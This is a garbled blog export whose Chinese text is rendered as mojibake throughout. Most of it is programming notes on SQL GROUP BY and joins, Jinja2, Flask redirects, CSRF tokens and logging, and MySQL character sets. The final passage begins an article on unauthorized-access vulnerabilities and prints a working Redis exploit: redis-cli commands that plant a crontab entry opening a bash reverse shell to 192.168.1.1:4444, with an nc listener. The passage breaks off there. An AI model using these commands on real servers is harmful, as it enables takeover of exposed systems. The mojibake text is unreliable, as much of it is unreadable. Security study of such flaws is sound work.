<p>group byçš„ç”¨æ³•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">group byæŒ‰ç…§æŸ¥è¯¢ç»“æœé›†ä¸­çš„æŸä¸€åˆ—ï¼ˆæˆ–å¤šåˆ—ï¼‰ï¼Œè¿›è¡Œåˆ†ç»„ï¼Œå€¼ç›¸ç­‰çš„ä¸ºä¸€ç»„</div><div class="line">1ã€ç»†åŒ–é›†å‡½æ•°ï¼ˆcountï¼Œsumï¼Œavgï¼Œmaxï¼Œminï¼‰çš„ä½œç”¨å¯¹è±¡ï¼š</div><div class="line">æœªå¯¹æŸ¥è¯¢ç»“æœåˆ†ç»„ï¼Œé›†å‡½æ•°å°†ä½œç”¨äºæ•´ä¸ªæŸ¥è¯¢ç»“æœã€‚</div><div class="line">å¯¹æŸ¥è¯¢ç»“æœåˆ†ç»„åï¼Œé›†å‡½æ•°å°†åˆ†åˆ«ä½œç”¨äºæ¯ä¸ªç»„ã€‚</div><div class="line">SELECT cno,count(sno) from sc group by cno</div><div class="line">2ã€GROUP BYå­å¥çš„ä½œç”¨å¯¹è±¡æ˜¯æŸ¥è¯¢çš„ä¸­é—´ç»“æœè¡¨</div><div class="line">åˆ†ç»„æ–¹æ³•ï¼šæŒ‰æŒ‡å®šçš„ä¸€åˆ—æˆ–å¤šåˆ—å€¼åˆ†ç»„ï¼Œå€¼ç›¸ç­‰çš„ä¸ºä¸€ç»„ã€‚</div><div class="line">ä½¿ç”¨GROUP BYå­å¥åï¼ŒSELECTå­å¥çš„åˆ—ååˆ—è¡¨ä¸­åªèƒ½å‡ºç°åˆ†ç»„å±æ€§ï¼ˆæ¯”å¦‚ï¼šsnoï¼‰å’Œé›†å‡½æ•°ï¼ˆæ¯”å¦‚ï¼šcountï¼ˆï¼‰ï¼‰</div><div class="line">select sno,count(cno) from sc group by sno</div><div class="line">3ã€å¤šä¸ªåˆ—å±æ€§è¿›è¡Œåˆ†ç»„</div><div class="line">select cno,grade,count(cno) from sc group by cno,grade</div><div class="line">4ã€ä½¿ç”¨HAVINGçŸ­è¯­ç­›é€‰æœ€ç»ˆè¾“å‡ºç»“æœ</div><div class="line">åªæœ‰æ»¡è¶³HAVINGçŸ­è¯­æŒ‡å®šæ¡ä»¶çš„ç»„æ‰è¾“å‡ºã€‚</div><div class="line">HAVINGçŸ­è¯­ä¸WHEREå­å¥çš„åŒºåˆ«ï¼šä½œç”¨å¯¹è±¡ä¸åŒã€‚</div><div class="line">1ã€WHEREå­å¥ä½œç”¨äºåŸºè¡¨æˆ–è§†å›¾ï¼Œä»ä¸­é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„å…ƒç»„ã€‚</div><div class="line">2ã€HAVINGçŸ­è¯­ä½œç”¨äºç»„ï¼Œä»ä¸­é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„ç»„</div><div class="line">select sno from sc group by sno having count(cno)&gt;3</div><div class="line">select sno,count(cno) from sc where grade&gt;60 group by sno having count(cno)&gt;3</div></pre></td></tr></table></figure>
<h1 id="MySQLçš„å·¦è¿æ¥ã€å³è¿æ¥ã€ç­‰å€¼è¿æ¥"><a href="#MySQLçš„å·¦è¿æ¥ã€å³è¿æ¥ã€ç­‰å€¼è¿æ¥" class="headerlink" title="MySQLçš„å·¦è¿æ¥ã€å³è¿æ¥ã€ç­‰å€¼è¿æ¥"></a>MySQLçš„å·¦è¿æ¥ã€å³è¿æ¥ã€ç­‰å€¼è¿æ¥</h1><h2 id="1-å·¦è¿æ¥ï¼ˆleft-join-ï¼‰"><a href="#1-å·¦è¿æ¥ï¼ˆleft-join-ï¼‰" class="headerlink" title="1.å·¦è¿æ¥ï¼ˆleft join ï¼‰"></a>1.å·¦è¿æ¥ï¼ˆleft join ï¼‰</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select m.columnnameâ€¦â€¦,n.* columnnameâ€¦..</div><div class="line">from left_table m left join right_table n on m.columnname_join=n.columnname_join and n.columnname=xxx</div><div class="line">where m.columnname=xxxâ€¦..</div></pre></td></tr></table></figure>
<p>ONæ˜¯è¿æ¥æ¡ä»¶ï¼Œç”¨äºæŠŠ2è¡¨ä¸­ç­‰å€¼çš„è®°å½•è¿æ¥åœ¨ä¸€èµ·ï¼Œä½†æ˜¯ä¸å½±å“è®°å½•é›†çš„æ•°é‡ã€‚è‹¥æ˜¯è¡¨<code>left_table</code>ä¸­çš„æŸè®°å½•ï¼Œæ— æ³•åœ¨è¡¨<code>right_table</code>æ‰¾åˆ°å¯¹åº”çš„è®°å½•ï¼Œåˆ™æ­¤è®°å½•ä¾ç„¶æ˜¾ç¤ºåœ¨è®°å½•é›†ä¸­ï¼Œåªæ˜¯è¡¨<code>right_table</code>éœ€è¦åœ¨æŸ¥è¯¢æ˜¾ç¤ºçš„åˆ—çš„å€¼ç”¨NULLæ›¿ä»£ï¼›</p>
<p>ONè¿æ¥æ¡ä»¶ä¸­è¡¨<code>n.columnname=xxx</code>ç”¨äºæ§åˆ¶<code>right_table</code>è¡¨æ˜¯å¦æœ‰ç¬¦åˆè¦æ±‚çš„åˆ—å€¼è¿˜æ˜¯ç”¨NULLæ›¿æ¢çš„æ–¹å¼æ˜¾ç¤ºåœ¨æŸ¥è¯¢åˆ—ä¸­ï¼Œä¸å½±å“è®°å½•é›†çš„æ•°é‡ï¼›</p>
<p>WHEREå­—å¥æ§åˆ¶è®°å½•æ˜¯å¦ç¬¦åˆæŸ¥è¯¢è¦æ±‚ï¼Œä¸ç¬¦åˆåˆ™è¿‡æ»¤æ‰</p>
<h2 id="2-å³è¿æ¥ï¼ˆright-joinï¼‰"><a href="#2-å³è¿æ¥ï¼ˆright-joinï¼‰" class="headerlink" title="2.å³è¿æ¥ï¼ˆright joinï¼‰"></a>2.å³è¿æ¥ï¼ˆright joinï¼‰</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select m.columnnameâ€¦â€¦,n.* columnnameâ€¦..</div><div class="line">from left_table m right join right_table n on m. columnname_join=n. columnname_join and m. columnname=xxx</div><div class="line">where n.columnname=xxxâ€¦..</div></pre></td></tr></table></figure>
<h2 id="3-ç­‰å€¼è¿æ¥"><a href="#3-ç­‰å€¼è¿æ¥" class="headerlink" title="3.ç­‰å€¼è¿æ¥"></a>3.ç­‰å€¼è¿æ¥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">select m.columnnameâ€¦â€¦,n.* columnnameâ€¦..</div><div class="line">from left_table m [inner] join right_table n on m. columnname_join=n. columnname_join</div><div class="line">where m.columnname=xxxâ€¦.. and n.columnname=xxxâ€¦.</div><div class="line">æˆ–è€…</div><div class="line">select m.columnnameâ€¦â€¦,n.* columnnameâ€¦..</div><div class="line">from left_table m  , right_table n</div><div class="line">where m. columnname_join=n. columnname_join and</div><div class="line">m.columnname=xxxâ€¦.. and n.columnname=xxxâ€¦.</div></pre></td></tr></table></figure>
<p>ONæ˜¯è¿æ¥æ¡ä»¶ï¼Œä¸å†ä¸å·¦è¿æ¥æˆ–å³è¿æ¥çš„åŠŸæ•ˆä¸€æ ·ï¼Œé™¤äº†ä½œä¸º2è¡¨è®°å½•åŒ¹é…çš„æ¡ä»¶å¤–ï¼Œè¿˜ä¼šèµ·åˆ°è¿‡æ»¤è®°å½•çš„ä½œç”¨ï¼Œè‹¥<code>left_table</code>ä¸­è®°å½•æ— æ³•åœ¨<code>right_table</code>ä¸­æ‰¾åˆ°å¯¹åº”çš„è®°å½•ï¼Œåˆ™ä¼šè¢«è¿‡æ»¤æ‰ï¼›</p>
<p>WHEREå­—å¥ï¼Œä¸ç®¡æ˜¯æ¶‰åŠè¡¨<code>left_table</code>ã€è¡¨<code>right_table</code>ä¸Šçš„é™åˆ¶æ¡ä»¶ï¼Œè¿˜æ˜¯æ¶‰åŠ2è¡¨è¿æ¥çš„æ¡ä»¶ï¼Œéƒ½ä¼šå¯¹è®°å½•é›†èµ·åˆ°è¿‡æ»¤ä½œç”¨ï¼ŒæŠŠä¸ç¬¦åˆè¦æ±‚çš„è®°å½•åˆ·é€‰æ‰ï¼›</p>
<h1 id="jinja2è·å–å¾ªç¯ç´¢å¼•"><a href="#jinja2è·å–å¾ªç¯ç´¢å¼•" class="headerlink" title="jinja2è·å–å¾ªç¯ç´¢å¼•"></a>jinja2è·å–å¾ªç¯ç´¢å¼•</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">jinja2è·å–å¾ªç¯&#123;% for i in n %&#125;çš„ç´¢å¼•ä½¿ç”¨loop.index</div><div class="line">&#123;% for i in names %&#125;</div><div class="line">&lt;tr&gt;</div><div class="line">    &lt;td&gt;&#123;&#123; loop.index &#125;&#125;&lt;/td&gt;  //å½“å‰æ˜¯ç¬¬xæ¡</div><div class="line">    &lt;td&gt;&#123;&#123; i.name &#125;&#125;&lt;/td&gt;</div><div class="line">&lt;/tr&gt;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure>
<h1 id="flask-é‡å®šå‘å’Œé”™è¯¯"><a href="#flask-é‡å®šå‘å’Œé”™è¯¯" class="headerlink" title="flask é‡å®šå‘å’Œé”™è¯¯"></a>flask é‡å®šå‘å’Œé”™è¯¯</h1><p>å¯ä»¥ç”¨<code>redirect()</code>å‡½æ•°æŠŠç”¨æˆ·é‡å®šå‘åˆ°å…¶å®ƒåœ°æ–¹ã€‚æ”¾å¼ƒè¯·æ±‚å¹¶è¿”å›é”™è¯¯ä»£ç ï¼Œç”¨<code>abort()</code>å‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from flask import abort, redirect, url_for</div><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def index():</div><div class="line">    return redirect(url_for(&apos;login&apos;))</div><div class="line">@app.route(&apos;/login&apos;)</div><div class="line">def login():</div><div class="line">    abort(401)</div><div class="line">    this_is_never_executed()</div></pre></td></tr></table></figure>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œé”™è¯¯ä»£ç ä¼šæ˜¾ç¤ºä¸€ä¸ªé»‘ç™½çš„é”™è¯¯é¡µé¢ã€‚å¦‚æœä½ è¦å®šåˆ¶é”™è¯¯é¡µé¢ï¼Œå¯ä»¥ä½¿ç”¨<code>errorhandler()</code></p>
<p>è£…é¥°å™¨:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from flask import render_template</div><div class="line">@app.errorhandler(404)</div><div class="line">def page_not_found(error):</div><div class="line">    return render_template(&apos;page_not_found.html&apos;), 404</div></pre></td></tr></table></figure>
<p>æ³¨æ„ <code>render_template()</code>è°ƒç”¨ä¹‹åçš„ 404 ã€‚è¿™å‘Šè¯‰Flaskï¼Œè¯¥é¡µçš„é”™è¯¯ä»£ç æ˜¯404 ï¼Œå³æ²¡æœ‰æ‰¾åˆ°ã€‚é»˜è®¤ä¸º200ï¼Œä¹Ÿå°±æ˜¯ä¸€åˆ‡æ­£å¸¸ã€‚</p>
<h1 id="flask-CSRFé˜²æŠ¤æœºåˆ¶"><a href="#flask-CSRFé˜²æŠ¤æœºåˆ¶" class="headerlink" title="flask CSRFé˜²æŠ¤æœºåˆ¶"></a>flask CSRFé˜²æŠ¤æœºåˆ¶</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">@app.before_request</div><div class="line">def csrf_protect():</div><div class="line">    if request.method == &quot;POST&quot;:</div><div class="line">        token = session.pop(&apos;_csrf_token&apos;, None)</div><div class="line">        if not token or token != request.form.get(&apos;_csrf_token&apos;):</div><div class="line">            abort(403)</div><div class="line">def some_random_string():</div><div class="line">    return  hashlib.sha256(os.urandom(16).hexdigest())</div><div class="line">def generate_csrf_token():</div><div class="line">    if &apos;_csrf_token&apos; not in session:</div><div class="line">        session[&apos;_csrf_token&apos;] = some_random_string()</div><div class="line">    return session[&apos;_csrf_token&apos;]</div></pre></td></tr></table></figure>
<p>åœ¨flaskçš„å…¨å±€å˜é‡é‡Œé¢æ³¨å†Š ä¸Šé¢é‚£ä¸ªç”Ÿæˆéšæœºtokençš„å‡½æ•°</p>
<p><code>app.jinja_env.globals[&#39;csrf_token&#39;] = generate_csrf_token</code></p>
<p>åœ¨ç½‘é¡µçš„æ¨¡æ¿æ˜¯è¿™ä¹ˆå¼•å…¥çš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;form method=post action=&quot;&quot;&gt;    </div><div class="line">&lt;input name=_csrf_token type=hidden value=&quot;&#123;&#123; csrf_token() &#125;&#125;&quot;&gt;</div></pre></td></tr></table></figure>
<h1 id="flaskä¸Šä¸‹æ–‡å¤„ç†å™¨"><a href="#flaskä¸Šä¸‹æ–‡å¤„ç†å™¨" class="headerlink" title="flaskä¸Šä¸‹æ–‡å¤„ç†å™¨"></a>flaskä¸Šä¸‹æ–‡å¤„ç†å™¨</h1><p>Flask ä¸Šä¸‹æ–‡å¤„ç†å™¨è‡ªåŠ¨å‘æ¨¡æ¿çš„ä¸Šä¸‹æ–‡ä¸­æ’å…¥æ–°å˜é‡ã€‚ä¸Šä¸‹æ–‡å¤„ç†å™¨åœ¨æ¨¡æ¿æ¸²æŸ“ä¹‹å‰è¿è¡Œï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ¨¡æ¿ä¸Šä¸‹æ–‡ä¸­æ’å…¥æ–°å€¼ã€‚ä¸Šä¸‹æ–‡å¤„ç†å™¨æ˜¯ä¸€ä¸ªè¿”å›å­—å…¸çš„å‡½æ•°ï¼Œè¿™ä¸ªå­—å…¸çš„é”®å€¼æœ€ç»ˆå°†ä¼ å…¥åº”ç”¨ä¸­æ‰€æœ‰æ¨¡æ¿çš„ä¸Šä¸‹æ–‡:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@app.context_processor</div><div class="line">def inject_user():</div><div class="line">    return dict(user=g.user)</div></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä¸Šä¸‹æ–‡å¤„ç†å™¨ä½¿å¾—æ¨¡æ¿å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸ºuserå€¼ä¸º<code>g.user</code>çš„å˜é‡ã€‚ä¸è¿‡è¿™ä¸ªä¾‹å­ä¸æ˜¯å¾ˆæœ‰æ„æ€ï¼Œå› ä¸ºgåœ¨æ¨¡æ¿ä¸­æœ¬æ¥å°±æ˜¯å¯ç”¨çš„ï¼Œä½†å®ƒè§£é‡Šäº†ä¸Šä¸‹æ–‡å¤„ç†å™¨æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚<br>å˜é‡ä¸ä»…é™äºå€¼ï¼Œä¸Šä¸‹æ–‡å¤„ç†å™¨ä¹Ÿå¯ä»¥ä½¿æŸä¸ªå‡½æ•°åœ¨æ¨¡æ¿ä¸­å¯ç”¨ï¼ˆç”±äºPythonå…è®¸ä¼ é€’å‡½æ•°ï¼‰:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@app.context_processor</div><div class="line">def utility_processor():</div><div class="line">    def format_price(amount, currency=u&apos;â‚¬&apos;):</div><div class="line">        return u&apos;&#123;0:.2f&#125;&#123;1&#125;.format(amount, currency)</div><div class="line">    return dict(format_price=format_price)</div><div class="line">ä¸Šé¢çš„ä¸Šä¸‹æ–‡å¤„ç†å™¨ä½¿å¾—format_priceå‡½æ•°åœ¨æ‰€æœ‰æ¨¡æ¿ä¸­å¯ç”¨:</div><div class="line">&#123;&#123; format_price(0.33) &#125;&#125;</div></pre></td></tr></table></figure>
<h1 id="æ—¥å¿—è®°å½•"><a href="#æ—¥å¿—è®°å½•" class="headerlink" title="æ—¥å¿—è®°å½•"></a>æ—¥å¿—è®°å½•</h1><p><code>handler = logging.FileHandler(&#39;flask.log&#39;, encoding=&#39;UTF-8&#39;)</code></p>
<h2 id="1ã€è¯·æ±‚ä¹‹å‰è®¾ç½®requestIdå¹¶è®°å½•æ—¥å¿—"><a href="#1ã€è¯·æ±‚ä¹‹å‰è®¾ç½®requestIdå¹¶è®°å½•æ—¥å¿—" class="headerlink" title="1ã€è¯·æ±‚ä¹‹å‰è®¾ç½®requestIdå¹¶è®°å½•æ—¥å¿—"></a>1ã€è¯·æ±‚ä¹‹å‰è®¾ç½®requestIdå¹¶è®°å½•æ—¥å¿—</h2><p>æ¯ä¸ªURLè¯·æ±‚ä¹‹å‰ï¼Œå®šä¹‰requestIdå¹¶ç»‘å®šåˆ°g</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">@app.before_request</div><div class="line">def before_request():</div><div class="line">    g.requestId = gen_requestId()</div><div class="line">    logger.info(&quot;Start Once Access, and this requestId is %s&quot; % g.requestId)</div></pre></td></tr></table></figure>
<h2 id="2ã€è¯·æ±‚ä¹‹åæ·»åŠ å“åº”å¤´ä¸è®°å½•æ—¥å¿—"><a href="#2ã€è¯·æ±‚ä¹‹åæ·»åŠ å“åº”å¤´ä¸è®°å½•æ—¥å¿—" class="headerlink" title="2ã€è¯·æ±‚ä¹‹åæ·»åŠ å“åº”å¤´ä¸è®°å½•æ—¥å¿—"></a>2ã€è¯·æ±‚ä¹‹åæ·»åŠ å“åº”å¤´ä¸è®°å½•æ—¥å¿—</h2><p>æ¯æ¬¡è¿”å›æ•°æ®ä¸­ï¼Œå¸¦ä¸Šå“åº”å¤´ï¼ŒåŒ…å«APIç‰ˆæœ¬å’Œæœ¬æ¬¡è¯·æ±‚çš„requestIdï¼Œä»¥åŠå…è®¸æ‰€æœ‰åŸŸè·¨åŸŸè®¿é—®API, è®°å½•è®¿é—®æ—¥å¿—</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">@app.after_request</div><div class="line">def add_header(response):</div><div class="line">    response.headers[&quot;X-SaintIC-Media-Type&quot;] = &quot;saintic.v1&quot;</div><div class="line">    response.headers[&quot;X-SaintIC-Request-Id&quot;] = g.requestId</div><div class="line">    response.headers[&quot;Access-Control-Allow-Origin&quot;] = &quot;*&quot;</div><div class="line">    logger.info(json.dumps(&#123;</div><div class="line">        &quot;AccessLog&quot;: &#123;</div><div class="line">            &quot;status_code&quot;: response.status_code,</div><div class="line">            &quot;method&quot;: request.method,</div><div class="line">            &quot;ip&quot;: request.headers.get(&apos;X-Real-Ip&apos;, request.remote_addr),</div><div class="line">            &quot;url&quot;: request.url,</div><div class="line">            &quot;referer&quot;: request.headers.get(&apos;Referer&apos;),</div><div class="line">            &quot;agent&quot;: request.headers.get(&quot;User-Agent&quot;),</div><div class="line">            &quot;requestId&quot;: str(g.requestId),</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    ))</div><div class="line">    return response</div></pre></td></tr></table></figure>
<p><code>basicConfig</code>æ–¹æ³•å¯ä»¥æ»¡è¶³ä½ åœ¨ç»å¤§å¤šæ•°åœºæ™¯ä¸‹çš„ä½¿ç”¨éœ€æ±‚ï¼Œä½†æ˜¯<code>basicConfig</code>æœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç¼ºç‚¹ã€‚è°ƒç”¨<code>basicConfig</code>å…¶å®æ˜¯ç»™<code>root logger</code>æ·»åŠ äº†ä¸€ä¸ª<code>handler(FileHandler )</code>ï¼Œè¿™æ ·å½“ä½ çš„ç¨‹åºå’Œåˆ«çš„ä½¿ç”¨äº† <code>logging</code>çš„ç¬¬ä¸‰æ–¹æ¨¡å—ä¸€èµ·å·¥ä½œæ—¶ï¼Œä¼šå½±å“ç¬¬ä¸‰æ–¹æ¨¡å—çš„<code>logger</code>è¡Œä¸ºã€‚è¿™æ˜¯ç”±loggerçš„ç»§æ‰¿ç‰¹æ€§å†³å®šçš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">logging.basicConfig(level=logging.DEBUG,</div><div class="line">                format=&apos;%(asctime)s %(levelname)s %(message)s&apos;,</div><div class="line">                datefmt=&apos;%a, %d %b %Y %H:%M:%S&apos;,</div><div class="line">                filename=&apos;logs/pro.log&apos;,</div><div class="line">                filemode=&apos;w&apos;)</div><div class="line"></div><div class="line">logging.debug(&apos;dddddddddd&apos;)</div></pre></td></tr></table></figure>
<h1 id="MySQLå­—ç¬¦ç¼–ç "><a href="#MySQLå­—ç¬¦ç¼–ç " class="headerlink" title="MySQLå­—ç¬¦ç¼–ç "></a>MySQLå­—ç¬¦ç¼–ç </h1><p>é™¤äº†è®¾ç½®æ•°æ®åº“çš„ä¹‹å¤–ï¼Œç”±äºdataseté»˜è®¤åˆ›å»ºæ•°æ®åº“å’Œè¡¨çš„å­—ç¬¦é›†ä¸æ˜¯utf8,æ‰€ä»¥éœ€è¦è‡ªå·±è®¾ç½®ï¼Œå¦åˆ™ä¼šä¸­æ–‡ä¹±ç ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹è¡¨çš„å­—ç¬¦é›†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">my.cnf</div><div class="line">[client]</div><div class="line">default-character-set=utf8</div><div class="line">[mysqld]</div><div class="line">character-set-server=utf8</div><div class="line">collation-server=utf8_general_ci</div><div class="line">default-storage-engine=INNODB</div></pre></td></tr></table></figure>
<p>è¡¨çš„å­—ç¬¦é›†</p>
<p><code>show create table tasks;</code></p>
<p><code>alter table tasks convert to character set utf8;</code></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
            <tag> Flask </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“]]></title>
      <url>/2017/09/28/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»Šå¹´5æœˆï¼Œæ¯”ç‰¹å¸å‹’ç´¢ç—…æ¯’WannaCryå¸­å·å…¨çƒï¼Œå›½å†…ä¼—å¤šæœºæ„éƒ¨é—¨è®¡ç®—æœºç³»ç»Ÿç˜«ç—ªã€‚æ ¹æ®ä¹‹å‰åº”æ€¥å“åº”çš„æ¡ˆä¾‹åˆ†æï¼Œä»¥åŠä¸€äº›å®‰å…¨æŠ¥å‘Šç»Ÿè®¡ï¼Œç›®å‰å¤§éƒ¨åˆ†çš„å‹’ç´¢ç—…æ¯’å‡åˆ©ç”¨æœªæˆæƒè®¿é—®ç­‰é€šç”¨æ¼æ´è¿›è¡Œæ¤å…¥ã€å‹’ç´¢ï¼Œå°¤å…¶æ˜¯Redisã€MongoDBç­‰æ•°æ®åº“çš„æœªæˆæƒè®¿é—®æ¼æ´å°¤å…¶ä¸¥é‡ã€‚<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/ransomware123.jpg" alt=""></p>
<h1 id="0x01-ä»‹ç»"><a href="#0x01-ä»‹ç»" class="headerlink" title="0x01 ä»‹ç»"></a>0x01 ä»‹ç»</h1><p><strong>æœªæˆæƒè®¿é—®å¯ä»¥ç†è§£ä¸ºéœ€è¦å®‰å…¨é…ç½®æˆ–æƒé™è®¤è¯çš„åœ°å€ã€æˆæƒé¡µé¢å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®ï¼Œä»è€Œå¼•å‘é‡è¦æƒé™å¯è¢«æ“ä½œã€æ•°æ®åº“ã€ç½‘ç«™ç›®å½•ç­‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</strong></p>
<p>ç›®å‰ä¸»è¦å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´çš„æœ‰ï¼šNFSæœåŠ¡ï¼ŒSambaæœåŠ¡ï¼ŒLDAPï¼ŒRsyncï¼ŒFTPï¼ŒGitLabï¼ŒJenkinsï¼ŒMongoDBï¼ŒRedisï¼ŒZooKeeperï¼ŒElasticSearchï¼ŒMemcacheï¼ŒCouchDBï¼ŒDockerï¼ŒSolrï¼ŒHadoopï¼ŒDubboç­‰ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»ä¸€äº›ç›®å‰æ¯”è¾ƒå¸¸ç”¨çš„ä¸€äº›æœåŠ¡çš„æœªæˆæƒè®¿é—®ï¼Œæ¬¢è¿å¤§å®¶è¡¥å……ï¼</p>
<h1 id="0x02-Redisæœªæˆæƒè®¿é—®"><a href="#0x02-Redisæœªæˆæƒè®¿é—®" class="headerlink" title="0x02 Redisæœªæˆæƒè®¿é—®"></a>0x02 Redisæœªæˆæƒè®¿é—®</h1><h2 id="2-1-æ¼æ´æè¿°"><a href="#2-1-æ¼æ´æè¿°" class="headerlink" title="2.1 æ¼æ´æè¿°"></a>2.1 æ¼æ´æè¿°</h2><p>Rediså› é…ç½®ä¸å½“å¯ä»¥æœªæˆæƒè®¿é—®ã€‚æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ã€‚å¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œå¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ã€‚</p>
<h2 id="2-2-æ¼æ´åˆ©ç”¨"><a href="#2-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.2 æ¼æ´åˆ©ç”¨"></a>2.2 æ¼æ´åˆ©ç”¨</h2><p><em>1ã€åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shell</em><br>åœ¨redisä»¥rootæƒé™è¿è¡Œæ—¶å¯ä»¥å†™crontabæ¥æ‰§è¡Œå‘½ä»¤åå¼¹shell</p>
<p>å…ˆåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£</p>
<blockquote>
<p>nc -lvnp 4444</p>
</blockquote>
<p>ç„¶åæ‰§è¡Œå‘½ä»¤:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.2.6</div><div class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n&quot;</div><div class="line">config set dir /var/spool/cron/</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure></p>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/redis-11.png" alt=""><br><em>2ã€å†™ssh-keygenå…¬é’¥ç™»å½•æœåŠ¡å™¨</em><br>åœ¨ä»¥ä¸‹æ¡ä»¶ä¸‹ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ–¹æ³•</p>
<blockquote>
